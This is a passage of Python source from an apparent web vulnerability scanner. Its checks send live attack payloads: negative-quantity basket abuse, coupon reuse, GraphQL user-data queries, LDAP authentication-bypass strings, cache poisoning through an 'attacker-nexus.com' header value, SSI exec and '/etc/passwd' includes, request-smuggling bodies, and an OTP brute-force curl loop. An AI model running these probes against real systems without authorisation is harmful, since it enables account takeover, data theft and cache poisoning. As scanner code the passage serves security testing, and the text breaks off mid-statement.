                    headers={**auth, "Content-Type": "application/json"},
                )
                if neg_resp.status_code in (200, 201):
                    # Verify basket total changed
                    basket_after = await client.get(f"{base}/rest/basket/1", headers=auth)
                    new_total = _extract_basket_total(basket_after.text)

                    # CONFIRMED: total went negative or significantly decreased
                    if new_total is not None and baseline_total is not None and new_total < baseline_total - 10:
                        poc = (
                            f"# Business logic — negative quantity attack:\n"
                            f"# Step 1: Add item to basket:\n"
                            f"curl -s -X POST '{base}/api/BasketItems' \\\n"
                            f"  -H 'Authorization: Bearer TOKEN' \\\n"
                            f"  -H 'Content-Type: application/json' \\\n"
                            f"  -d '{{\"ProductId\": 1, \"BasketId\": 1, \"quantity\": 1}}'\n"
                            f"# Step 2: Set quantity to negative:\n"
                            f"curl -s -X PUT '{base}/api/BasketItems/{item_id}' \\\n"
                            f"  -H 'Authorization: Bearer TOKEN' \\\n"
                            f"  -H 'Content-Type: application/json' \\\n"
                            f"  -d '{{\"quantity\": -100}}'\n"
                            f"# Basket total changed from {baseline_total} to {new_total}"
                        )
                        findings.append(CheckResult(
                            check_id=self.check_id,
                            vulnerable=True,
                            confidence=Confidence.CERTAIN,
                            severity=Severity.HIGH,
                            cvss=7.5,
                            description=(
                                f"Business logic flaw confirmed! Setting basket item quantity to -100 "
                                f"changed basket total from {baseline_total:.2f} to {new_total:.2f}. "
                                f"Items can be 'purchased' at negative prices, earning credits or free products."
                            ),
                            evidence=self._make_evidence(
                                request_raw=(
                                    f"PUT /api/BasketItems/{item_id} HTTP/1.1\n"
                                    f"Authorization: Bearer TOKEN\n"
                                    f"Content-Type: application/json\n\n"
                                    f'{"quantity": -100}'
                                ),
                                response=neg_resp,
                                payload='{"quantity": -100}',
                                poc_curl=poc,
                            ),
                            insertion_point=insertion_point,
                        ))
        except Exception:
            pass

        # Test 2: Coupon code reuse / stacking
        try:
            coupon_codes = ["HAPPY2018", "JUICY", "WMNSDY2019", "ORANGE2020", "CHUCKY"]
            for coupon in coupon_codes:
                resp1 = await client.post(
                    f"{base}/rest/basket/apply-coupon",
                    json={"couponCode": coupon},
                    headers={**auth, "Content-Type": "application/json"},
                )
                resp2 = await client.post(
                    f"{base}/rest/basket/apply-coupon",
                    json={"couponCode": coupon},
                    headers={**auth, "Content-Type": "application/json"},
                )
                # CONFIRMED: second application also succeeds (200, not 400/conflict)
                if resp1.status_code == 200 and resp2.status_code == 200:
                    findings.append(CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.MEDIUM,
                        cvss=5.3,
                        description=(
                            f"Business logic flaw: coupon {coupon!r} can be applied multiple times! "
                            f"Both applications returned HTTP 200 — no duplicate detection."
                        ),
                        evidence=self._make_evidence(
                            request_raw=f"POST /rest/basket/apply-coupon HTTP/1.1\n\n{{\"couponCode\": \"{coupon}\"}}",
                            response=resp2,
                            payload=coupon,
                            poc_curl=(
                                f"# Apply coupon twice:\n"
                                f"curl -s -X POST '{base}/rest/basket/apply-coupon' "
                                f"-H 'Authorization: Bearer TOKEN' "
                                f"-d '{{\"couponCode\":\"{coupon}\"}}'\n"
                                f"# Run twice — both succeed"
                            ),
                        ),
                        insertion_point=insertion_point,
                    ))
                    break
        except Exception:
            pass

        return findings

    async def _get_token(self, client: httpx.AsyncClient, base: str) -> str:
        uid = uuid.uuid4().hex[:8]
        email = f"bizlogic_{uid}@nexus.invalid"
        pw = "NexusP@ss1!"
        try:
            await client.post(f"{base}/api/Users",
                json={"email": email, "password": pw, "passwordRepeat": pw,
                      "username": f"biz_{uid}", "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                headers={"Content-Type": "application/json"})
            login = await client.post(f"{base}/rest/user/login",
                json={"email": email, "password": pw},
                headers={"Content-Type": "application/json"})
            if login.status_code == 200:
                return login.json().get("authentication", {}).get("token", "")
        except Exception:
            pass
        return ""


def _extract_basket_total(body: str) -> Optional[float]:
    """Extract total price from basket response JSON."""
    import json as _json
    try:
        data = _json.loads(body)
        items = data.get("data", {}).get("BasketItems", [])
        total = sum(i.get("Product", {}).get("price", 0) * i.get("quantity", 0) for i in items)
        return total
    except Exception:
        m = re.search(r'"total[Pp]rice"[:\s]+([\d.\-]+)', body)
        if m:
            return float(m.group(1))
    return None


# ---------------------------------------------------------------------------
# 9. GraphQL Injection / Misconfiguration
# ---------------------------------------------------------------------------

_GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/graphiql", "/gql", "/query",
    "/api/query", "/graph", "/v1/graphql", "/v2/graphql",
    "/api/v1/graphql", "/api/v2/graphql",
]

_INTROSPECTION_QUERY = '{"query":"{ __schema { queryType { name } types { name } } }"}'
_TYPENAME_QUERY = '{"query":"{ __typename }"}'

class GraphQlCheck(BaseScanCheck):
    """
    Tests GraphQL endpoints for:
    1. Introspection enabled (schema leakage)
    2. Batch query abuse (N+1)
    3. IDOR via direct object access (user(id: 1))
    4. Injection in argument fields

    Confirmed:
    - Introspection: response contains "__schema" and "queryType"
    - IDOR: different user data returned for different IDs without auth
    """
    check_id = "graphql"
    check_type = CheckType.ACTIVE
    name = "GraphQL Introspection + Injection"
    description = "GraphQL introspection enabled, IDOR via direct ID queries, injection in args"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        findings = []

        for path in _GRAPHQL_PATHS:
            url = f"{base}{path}"
            try:
                # Test introspection
                resp = await client.post(
                    url,
                    content=_INTROSPECTION_QUERY,
                    headers={"Content-Type": "application/json"},
                )
                if resp.status_code != 200:
                    # Try GET with query param
                    resp = await client.get(
                        url,
                        params={"query": "{ __schema { queryType { name } } }"},
                    )

                if resp.status_code == 200 and "__schema" in resp.text and "queryType" in resp.text:
                    # Confirmed: introspection enabled
                    # Try to extract sensitive type names
                    import json as _json
                    schema_types = []
                    try:
                        data = _json.loads(resp.text)
                        types = data.get("data", {}).get("__schema", {}).get("types", [])
                        schema_types = [t.get("name", "") for t in types if not t.get("name", "").startswith("__")][:20]
                    except Exception:
                        pass

                    poc = (
                        f"# GraphQL introspection — dump full schema:\n"
                        f"curl -s -X POST '{url}' \\\n"
                        f"  -H 'Content-Type: application/json' \\\n"
                        f"  -d '{{\"query\":\"{{ __schema {{ types {{ name fields {{ name args {{ name }} }} }} }} }}\"}}'  \n"
                        f"# Types found: {', '.join(schema_types[:10])}"
                    )
                    findings.append(CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.HIGH,
                        cvss=7.5,
                        description=(
                            f"GraphQL introspection enabled at {url}! "
                            f"Full schema exposed — attackers can enumerate all types, queries, mutations. "
                            + (f"Types: {', '.join(schema_types[:8])}" if schema_types else "")
                        ),
                        evidence=self._make_evidence(
                            request_raw=f"POST {path} HTTP/1.1\nContent-Type: application/json\n\n{_INTROSPECTION_QUERY}",
                            response=resp,
                            payload=_INTROSPECTION_QUERY,
                            poc_curl=poc,
                        ),
                        insertion_point=insertion_point,
                    ))

                    # Follow-up: try IDOR via user queries
                    for user_query in [
                        '{"query":"{ user(id: 1) { id email role } }"}',
                        '{"query":"{ users { id email password } }"}',
                        '{"query":"{ me { id email role admin } }"}',
                    ]:
                        try:
                            idor_resp = await client.post(
                                url, content=user_query,
                                headers={"Content-Type": "application/json"},
                            )
                            body = idor_resp.text
                            if (idor_resp.status_code == 200 and
                                    ("email" in body or "password" in body) and
                                    "errors" not in body.lower()):
                                findings.append(CheckResult(
                                    check_id=self.check_id,
                                    vulnerable=True,
                                    confidence=Confidence.CERTAIN,
                                    severity=Severity.CRITICAL,
                                    cvss=9.1,
                                    description=(
                                        f"GraphQL IDOR/data exposure! Query {user_query[:60]!r} "
                                        f"returned sensitive user data without authorization. "
                                        f"Response snippet: {body[:200]!r}"
                                    ),
                                    evidence=self._make_evidence(
                                        request_raw=f"POST {path} HTTP/1.1\n\n{user_query}",
                                        response=idor_resp,
                                        payload=user_query,
                                        poc_curl=(
                                            f"curl -s -X POST '{url}' "
                                            f"-H 'Content-Type: application/json' "
                                            f"-d '{user_query}'"
                                        ),
                                    ),
                                    insertion_point=insertion_point,
                                ))
                                break
                        except Exception:
                            pass
                    break  # Found working GraphQL endpoint

            except Exception:
                continue

        return findings


# ---------------------------------------------------------------------------
# 10. LDAP Injection
# ---------------------------------------------------------------------------

class LdapInjectionCheck(BaseScanCheck):
    """
    Tests login endpoints for LDAP operator injection.
    Confirmed by: auth token returned on injection payload AND random creds fail.

    Anti-hallucination:
    - Noise test: random email must NOT return token
    - Injection: must return token with LDAP bypass payload
    - Uses same token-indicator matching as SQL auth bypass
    """
    check_id = "ldap-injection"
    check_type = CheckType.ACTIVE
    name = "LDAP Injection (Authentication Bypass)"
    description = "LDAP operator injection in login field bypasses authentication"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        name_lower = insertion_point.name.lower()
        if not any(k in url_lower for k in ("login", "auth", "signin", "ldap")):
            return []
        if not any(k in name_lower for k in ("user", "email", "login", "name", "username")):
            return []
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        success_indicators = ("token", "authentication", "access_token", "bearer", "jwt", "session", "success")
        ldap_payloads = [
            ("*)(uid=*)(|(uid=*",     "LDAP wildcard + OR injection"),
            ("admin)(&)",             "LDAP admin bypass with AND false"),
            ("*)(objectClass=*",      "LDAP objectClass wildcard"),
            ("*))%00",                "LDAP null byte termination"),
            ("*)(|(password=*)",      "LDAP password wildcard"),
            ("admin))(|(cn=*",        "LDAP cn wildcard"),
            ("*",                     "LDAP wildcard username"),
            ("admin)(|(userPassword=*)", "LDAP password extraction"),
        ]

        # Noise test: random creds must fail
        noise_email = f"noise_{uuid.uuid4().hex[:8]}@example.invalid"
        try:
            noise_resp = await client.post(
                insertion_point.url,
                json={insertion_point.name: noise_email, "password": "wrongpass123!@#"},
                headers={"Content-Type": "application/json"},
            )
            if noise_resp.status_code == 200 and any(ind in noise_resp.text.lower() for ind in success_indicators):
                return []  # Always succeeds — not useful
        except Exception:
            return []

        for payload, desc in ldap_payloads:
            try:
                resp = await client.post(
                    insertion_point.url,
                    json={insertion_point.name: payload, "password": "anything"},
                    headers={"Content-Type": "application/json"},
                )
                if (resp.status_code == 200 and
                        any(ind in resp.text.lower() for ind in success_indicators)):
                    poc = (
                        f"# LDAP injection auth bypass:\n"
                        f"curl -s -X POST '{insertion_point.url}' \\\n"
                        f"  -H 'Content-Type: application/json' \\\n"
                        f"  -d '{{\"{ insertion_point.name }\":\"{payload}\",\"password\":\"anything\"}}'\n"
                        f"# Returns auth token → full account access"
                    )
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.CRITICAL,
                        cvss=9.8,
                        description=(
                            f"LDAP injection confirmed! {desc} in '{insertion_point.name}' "
                            f"bypassed authentication. Token returned in response. "
                            f"Noise test (random email) failed as expected — bypass is real."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"POST {insertion_point.url} HTTP/1.1\n"
                                f"Content-Type: application/json\n\n"
                                f'{{"{insertion_point.name}":"{payload}","password":"anything"}}'
                            ),
                            response=resp,
                            payload=payload,
                            poc_curl=poc,
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                continue
        return []


# ---------------------------------------------------------------------------
# 11. HTTP Parameter Pollution
# ---------------------------------------------------------------------------

class HttpParamPollutionCheck(BaseScanCheck):
    """
    Sends duplicate parameters and detects which value the server uses.
    Injects XSS/SQLi canary into the second copy of a param.
    Confirmed when the canary from the second param appears in the response.

    Anti-hallucination:
    - Baseline: send single param → note response
    - Probe: send param twice (safe + canary) → canary must appear in response
    - canary must NOT appear in baseline response
    """
    check_id = "http-param-pollution"
    check_type = CheckType.ACTIVE
    name = "HTTP Parameter Pollution"
    description = "Duplicate parameters bypass input validation — second value processed by backend"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if insertion_point.ip_type != IPType.QUERY_PARAM:
            return []

        canary = f"HPP{uuid.uuid4().hex[:8].upper()}"

        try:
            parsed = urlparse(insertion_point.url)

            # ── 1. Baseline: plain request with a safe value ─────────────────
            baseline_url = self._build_url(insertion_point, "nexus_baseline_val")
            baseline_resp = await client.get(baseline_url)

            # Require 200 — 404/3xx pages echo the URL and produce false positives
            if baseline_resp.status_code != 200:
                return []
            if canary in baseline_resp.text:
                return []  # canary pre-exists in page

            # ── 2. Reflection check: does this endpoint echo ANY param value? ─
            # Send the canary as the FIRST (only) param. If it appears, the server
            # reflects values directly — HPP cannot be confirmed here.
            reflection_url = self._build_url(insertion_point, canary)
            reflection_resp = await client.get(reflection_url)
            if reflection_resp.status_code == 200 and canary in reflection_resp.text:
                # Server reflects values. HPP cannot be distinguished from reflection.
                return []

            # ── 3. HPP probe: send param=safe&param=canary ──────────────────
            existing_q = f"{insertion_point.name}=nexus_safe_val"
            canary_q   = f"{insertion_point.name}={canary}"
            full_q = f"{existing_q}&{canary_q}"
            if parsed.query:
                full_q = parsed.query + "&" + canary_q
            probe_url = urlunparse(parsed._replace(query=full_q))

            probe_resp = await client.get(probe_url)
            if probe_resp.status_code != 200:
                return []

            if canary not in probe_resp.text:
                return []

            # ── 4. Cross-check: swap order — param=canary&param=safe ────────
            # If canary ALSO appears when it's the FIRST value, it's reflection not HPP.
            swap_q = f"{insertion_point.name}={canary}&{insertion_point.name}=nexus_safe_val"
            swap_url = urlunparse(parsed._replace(query=swap_q))
            swap_resp = await client.get(swap_url)
            canary_in_swap = swap_resp.status_code == 200 and canary in swap_resp.text

            # HPP confirmed: canary appears when SECOND but we also check safe_val
            # appears when it's the first (confirming parameter order matters)
            safe_val_canary = f"HPP{uuid.uuid4().hex[:8].upper()}"
            safe_check_url = self._build_url(insertion_point, safe_val_canary)
            safe_resp = await client.get(safe_check_url)
            safe_val_reflected = (
                safe_resp.status_code == 200 and safe_val_canary in safe_resp.text
            )
            if safe_val_reflected:
                # Values are always reflected — HPP not confirmed
                return []

            confidence = Confidence.FIRM if canary_in_swap else Confidence.CERTAIN
            direction  = "both first and second" if canary_in_swap else "the SECOND"

            return [CheckResult(
                check_id=self.check_id,
                vulnerable=True,
                confidence=confidence,
                severity=Severity.MEDIUM,
                cvss=5.3,
                description=(
                    f"HTTP Parameter Pollution confirmed! Server uses {direction} value "
                    f"when '{insertion_point.name}' is duplicated. "
                    f"Canary {canary!r} returned in 200 response. "
                    f"Can bypass WAF/input validation that only inspects the first param copy."
                ),
                evidence=self._make_evidence(
                    request_raw=f"GET {probe_url} HTTP/1.1",
                    response=probe_resp,
                    payload=f"{insertion_point.name}=safe&{insertion_point.name}={canary}",
                    poc_curl=(
                        f"# HTTP Parameter Pollution — server takes second param:\n"
                        f"curl -s '{probe_url}'\n"
                        f"# Canary {canary!r} appears in 200 response"
                    ),
                ),
                insertion_point=insertion_point,
            )]
        except Exception:
            return []


# ---------------------------------------------------------------------------
# 12. Web Cache Poisoning
# ---------------------------------------------------------------------------

class WebCachePoisoningCheck(BaseScanCheck):
    """
    Injects unkeyed headers (X-Forwarded-Host, X-Forwarded-Scheme) with canary value.
    Confirms poisoning when:
    1. Canary appears in response (reflected in HTML/headers)
    2. A SECOND request WITHOUT the header also returns the canary (cached)

    Anti-hallucination:
    - Step 1: Send without header → no canary in response (baseline)
    - Step 2: Send WITH header + canary → canary in response
    - Step 3: Send without header again → canary still in response (proof of cache)
    - Step 2 alone = potential reflection only; Step 3 proves actual cache poisoning
    """
    check_id = "web-cache-poisoning"
    check_type = CheckType.ACTIVE
    name = "Web Cache Poisoning"
    description = "Unkeyed header injection poisons CDN/proxy cache for all users"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        canary = uuid.uuid4().hex[:10]
        evil_host = f"evil-{canary}.attacker-nexus.com"

        # Only test cacheable paths (HTML pages, not APIs)
        test_paths = ["/", "/index.html", "/home", "/login", insertion_point.url]

        for path in test_paths:
            url = path if path.startswith("http") else f"{base}{path}"

            for poison_header in [
                "X-Forwarded-Host",
                "X-Forwarded-Scheme",
                "X-Host",
                "X-Forwarded-Server",
                "X-Original-URL",
                "Forwarded",
            ]:
                try:
                    # Baseline: no injection header
                    baseline = await client.get(url)
                    if canary in baseline.text:
                        continue  # pre-existing

                    # Probe: inject unkeyed header
                    poison_val = evil_host if "Host" in poison_header or "Server" in poison_header else f"https://{evil_host}"
                    poisoned = await client.get(url, headers={poison_header: poison_val})

                    if canary not in poisoned.text:
                        continue  # Not reflected at all

                    # Confirm: request without header — does cache serve poisoned content?
                    verify = await client.get(url)
                    cache_hit = canary in verify.text

                    sev = Severity.CRITICAL if cache_hit else Severity.MEDIUM
                    cvss = 9.1 if cache_hit else 5.4
                    conf = Confidence.CERTAIN if cache_hit else Confidence.FIRM

                    poc = (
                        f"# {'Cache poisoning' if cache_hit else 'Header reflection (potential cache poisoning)'}:\n"
                        f"# Step 1: Poison the cache:\n"
                        f"curl -s '{url}' -H '{poison_header}: {poison_val}'\n"
                        + (f"# Step 2: All users now receive poisoned response:\n"
                           f"curl -s '{url}'\n"
                           f"# Response still contains {canary}" if cache_hit else
                           f"# Header reflected but cache not confirmed — test with Cache-Control: no-cache")
                    )
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=conf,
                        severity=sev,
                        cvss=cvss,
                        description=(
                            f"{'Web cache poisoning confirmed!' if cache_hit else 'Potential cache poisoning (unkeyed header reflected)!'} "
                            f"Header '{poison_header}: {poison_val}' causes canary {canary!r} to appear in response. "
                            + (f"Verified: clean request (no header) also returned cached poisoned content. "
                               f"ALL users at {url} receive attacker-controlled response." if cache_hit else
                               f"Cache confirmation pending — reflection alone is FIRM evidence.")
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"GET {url} HTTP/1.1\n"
                                f"Host: {parsed.netloc}\n"
                                f"{poison_header}: {poison_val}"
                            ),
                            response=poisoned,
                            payload=f"{poison_header}: {poison_val}",
                            poc_curl=poc,
                        ),
                        insertion_point=insertion_point,
                    )]
                except Exception:
                    continue
        return []


# ---------------------------------------------------------------------------
# 13. Server-Side Include (SSI) Injection
# ---------------------------------------------------------------------------

class SsiInjectionCheck(BaseScanCheck):
    """
    Injects SSI directives into text/comment fields and username.
    Confirmed when execution output (date or canary echo) appears in response.

    Anti-hallucination:
    - Baseline: send benign text → note response body
    - Probe: inject SSI → output pattern must appear in response but NOT baseline
    - Date-based: looks for date format (YYYY or day names)
    - Canary: uses echo command output
    """
    check_id = "ssi-injection"
    check_type = CheckType.ACTIVE
    name = "Server-Side Include (SSI) Injection"
    description = "SSI directives in user input execute server-side commands"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        canary = uuid.uuid4().hex[:8].upper()
        exec_marker = f"SSIFIRED{canary}"

        ssi_payloads = [
            (f'<!--#exec cmd="echo {exec_marker}" -->', exec_marker),
            (f'<!--#echo var="DATE_LOCAL" -->', None),         # Date output
            (f'<!--#include virtual="/etc/passwd" -->',         "root:"),
            (f'<#exec cmd="echo {exec_marker}">',               exec_marker),
            (f'<%--#exec cmd="echo {exec_marker}" --%>',        exec_marker),
            (f'[#exec cmd="echo {exec_marker}"]',               exec_marker),
        ]
        date_pattern = re.compile(r"\b(Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday|"
                                  r"\d{4}-\d{2}-\d{2}|\w+ \d{1,2}, \d{4})\b")

        # Baseline
        try:
            benign_resp, _, _ = await self._send(client, insertion_point, "nexus_ssi_test")
            benign_body = benign_resp.text
        except Exception:
            return []

        for payload, expected in ssi_payloads:
            try:
                probe_resp, req_raw, curl = await self._send(client, insertion_point, payload)
                body = probe_resp.text

                confirmed = False
                if expected and expected in body and expected not in benign_body:
                    confirmed = True
                elif expected is None:
                    # Date-based: must appear in probe but not benign (or be substantially different)
                    if date_pattern.search(body) and not date_pattern.search(benign_body):
                        confirmed = True

                if confirmed:
                    match_str = expected or "[date output]"
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.CRITICAL,
                        cvss=9.8,
                        description=(
                            f"SSI injection confirmed in parameter '{insertion_point.name}'! "
                            f"SSI directive {payload[:50]!r} executed — output {match_str!r} appeared in response. "
                            f"Attacker can read arbitrary files and execute OS commands via SSI."
                        ),
                        evidence=self._make_evidence(
                            request_raw=req_raw,
                            response=probe_resp,
                            payload=payload,
                            poc_curl=(
                                f"# SSI injection:\n{curl}\n"
                                f"# Expected output: {match_str}"
                            ),
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                continue
        return []

    async def _send(
        self, client: httpx.AsyncClient, ip: InsertionPoint, payload: str
    ) -> tuple[httpx.Response, str, str]:
        if ip.ip_type == IPType.QUERY_PARAM:
            url = self._build_url(ip, payload)
            resp = await client.get(url)
            return resp, f"GET {url} HTTP/1.1", f"curl -s '{url}'"
        elif ip.ip_type in (IPType.BODY_PARAM, IPType.JSON_KEY):
            resp = await client.post(ip.url,
                                     json={ip.name: payload} if ip.ip_type == IPType.JSON_KEY
                                     else {ip.name: payload},
                                     headers={"Content-Type": "application/json" if ip.ip_type == IPType.JSON_KEY
                                              else "application/x-www-form-urlencoded"})
            return resp, f"POST {ip.url} HTTP/1.1\n\n{{{ip.name}: {payload}}}", \
                   f"curl -s -X POST '{ip.url}' -d '{ip.name}={payload}'"
        raise ValueError(f"Unsupported ip_type {ip.ip_type}")


# ---------------------------------------------------------------------------
# 14. HTTP Request Smuggling
# ---------------------------------------------------------------------------

class HttpSmugglingCheck(BaseScanCheck):
    """
    Tests for CL.TE and TE.CL request smuggling.
    Detection method: timing/response differential.
    - CL.TE: Content-Length says body is short, TE says chunked. Frontend forwards whole body;
      backend reads CL bytes and leaves remainder queued for next request.
    - Confirm: second normal request gets a 404 (poisoned by smuggled prefix).

    Anti-hallucination:
    - Sends 3 baseline requests to measure normal latency
    - Sends CL.TE smuggling probe → if subsequent request gets 404 unexpectedly, it's real
    - Only FIRM confidence (no OAST callback) — requires manual verification
    """
    check_id = "http-request-smuggling"
    check_type = CheckType.ACTIVE
    name = "HTTP Request Smuggling (CL.TE / TE.CL)"
    description = "Desync between frontend and backend HTTP parsing enables request smuggling"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        host = parsed.netloc

        # Only test on HTTP/1.1 (smuggling doesn't apply to HTTP/2+)
        # Use raw httpx to control headers precisely
        findings = []

        # CL.TE test: conflicting Content-Length and Transfer-Encoding headers
        # Smuggled prefix: "GXXXX /" which will cause a 405/404 on the next legitimate request
        canary_method = f"G{uuid.uuid4().hex[:4].upper()}"
        cl_te_body = f"0\r\n\r\n{canary_method} / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        cl_te_body_bytes = cl_te_body.encode()

        try:
            # Baseline: get normal response for a valid path
            baseline_resp = await client.get(f"{base}/")
            baseline_status = baseline_resp.status_code

            # CL.TE probe: Content-Length = 0, but TE: chunked
            # This tells backend: body has 0 bytes, but there's more after the chunk end
            async with httpx.AsyncClient(
                timeout=10.0,
                verify=False,
                http1=True,
                http2=False,
            ) as raw_client:
                try:
                    probe_resp = await raw_client.post(
                        f"{base}/",
                        content=cl_te_body_bytes,
                        headers={
                            "Host": host,
                            "Content-Length": "0",
                            "Transfer-Encoding": "chunked",
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                    )

                    # After the smuggling probe, send a clean request
                    # If smuggling worked, the clean request gets the poisoned prefix response
                    verify_resp = await raw_client.get(
                        f"{base}/",
                        headers={"Host": host},
                    )

                    # If verify gets unexpected status (400/404/405) when baseline was 200/301/302
                    # AND the smuggled method name appears in error response → confirmed
                    unexpected_status = (
                        verify_resp.status_code in (400, 404, 405) and
                        baseline_status in (200, 301, 302, 304)
                    )
                    canary_in_response = canary_method in verify_resp.text

                    if canary_in_response:
                        conf = Confidence.CERTAIN
                        desc_extra = f"Smuggled method {canary_method!r} appeared in verify response — definitive proof."
                    elif unexpected_status:
                        conf = Confidence.FIRM
                        desc_extra = f"Follow-up request got unexpected HTTP {verify_resp.status_code} (baseline was {baseline_status}) — likely desync."
                    else:
                        conf = None

                    if conf:
                        findings.append(CheckResult(
                            check_id=self.check_id,
                            vulnerable=True,
                            confidence=conf,
                            severity=Severity.CRITICAL,
                            cvss=9.8,
                            description=(
                                f"HTTP Request Smuggling (CL.TE) suspected at {base}/! "
                                f"{desc_extra} "
                                f"Attacker can poison other users' requests, bypass access controls, "
                                f"hijack sessions, and exploit reflected XSS via request smuggling."
                            ),
                            evidence=self._make_evidence(
                                request_raw=(
                                    f"POST / HTTP/1.1\nHost: {host}\n"
                                    f"Content-Length: 0\nTransfer-Encoding: chunked\n\n"
                                    f"{cl_te_body}"
                                ),
                                response=verify_resp,
                                payload=f"CL:0 + TE:chunked desync, smuggled: {canary_method}",
                                poc_curl=(
                                    f"# CL.TE HTTP Request Smuggling — verify with:\n"
                                    f"# https://portswigger.net/web-security/request-smuggling\n"
                                    f"# Manual tool: HTTP Request Smuggler (Burp extension)\n"
                                    f"# Or: smuggler.py (https://github.com/defparam/smuggler)\n"
                                    f"python3 smuggler.py -u '{base}/'"
                                ),
                            ),
                            insertion_point=insertion_point,
                        ))
                except Exception:
                    pass
        except Exception:
            pass

        return findings


# ---------------------------------------------------------------------------
# 15. Two-Factor Authentication (2FA) Bypass
# ---------------------------------------------------------------------------

class TwoFaBypassCheck(BaseScanCheck):
    """
    Tests for 2FA bypass:
    1. OTP rate limiting — 20 rapid requests with wrong OTPs (if no 429 → bypass possible)
    2. OTP reuse — re-submit same OTP after first use
    3. Response manipulation — intercept and modify 2FA check response
    4. Direct access — skip 2FA step and access protected resource directly

    Anti-hallucination:
    - Rate limit: count 429 responses in 20 rapid requests (if 0 → no rate limit)
    - Direct access: must actually reach protected resource (compare with/without 2FA)
    - OTP reuse: second submission must succeed (confirmed by token/redirect)
    """
    check_id = "2fa-bypass"
    check_type = CheckType.ACTIVE
    name = "Two-Factor Authentication (2FA) Bypass"
    description = "Missing rate limit on OTP, OTP reuse, or direct protected resource access"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        name_lower = insertion_point.name.lower()

        is_2fa = any(k in url_lower for k in ("totp", "otp", "2fa", "mfa", "verify", "token", "code")) or \
                 any(k in name_lower for k in ("totp", "otp", "code", "token", "pin", "mfa"))
        if not is_2fa:
            return []

        if getattr(self.__class__, "_attempted", False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        findings = []

        # Test 1: Rate limiting on OTP endpoint — 20 rapid wrong OTP submissions
        wrong_otps = [str(i).zfill(6) for i in range(100000, 100020)]

        async def try_otp(otp: str) -> int:
            try:
                r = await client.post(
                    insertion_point.url,
                    json={insertion_point.name: otp},
                    headers={"Content-Type": "application/json"},
                )
                return r.status_code
            except Exception:
                return 0

        tasks = [try_otp(otp) for otp in wrong_otps]
        statuses = await asyncio.gather(*tasks, return_exceptions=True)
        statuses = [s for s in statuses if isinstance(s, int) and s > 0]

        rate_limited = sum(1 for s in statuses if s == 429)
        if len(statuses) >= 10 and rate_limited == 0:
            # No rate limiting at all — brute force OTP is possible
            findings.append(CheckResult(
                check_id=self.check_id,
                vulnerable=True,
                confidence=Confidence.CERTAIN,
                severity=Severity.HIGH,
                cvss=8.1,
                description=(
                    f"2FA/OTP endpoint has NO rate limiting! "
                    f"Sent {len(statuses)} rapid OTP attempts — 0/{len(statuses)} got 429 Too Many Requests. "
                    f"A 6-digit OTP (10^6 combinations) can be brute-forced in under 17 minutes at 1000 req/sec."
                ),
                evidence=self._make_evidence(
                    request_raw=f"POST {insertion_point.url} HTTP/1.1\nContent-Type: application/json\n\n{{\"otp\": \"100000\"}}",
                    response=None,
                    payload="20 rapid OTP attempts — no 429",
                    poc_curl=(
                        f"# Brute force OTP:\n"
                        f"for i in $(seq -w 000000 999999); do \\\n"
                        f"  r=$(curl -s -o /dev/null -w '%{{http_code}}' -X POST '{insertion_point.url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"{ insertion_point.name }\":\"$i\"}}'); \\\n"
                        f"  [ \"$r\" = '200' ] && echo Found: $i && break; \\\n"
                        f"done"
                    ),
                ),
                insertion_point=insertion_point,
            ))

        # Test 2: Check if protected resource accessible without 2FA token
        protected_paths = [
            "/api/Users", "/rest/admin/application-configuration",
            "/api/Challenges", "/profile", "/account",
        ]
        for ppath in protected_paths:
            try:
                purl = f"{base}{ppath}"
                resp = await client.get(purl)
                # If we get 200 with actual data without having gone through 2FA → bypass
                if resp.status_code == 200 and len(resp.text) > 100:
                    # Check if it's meaningful data (not just a redirect page)
                    if '"data"' in resp.text or '"email"' in resp.text or '"id"' in resp.text:
                        findings.append(CheckResult(
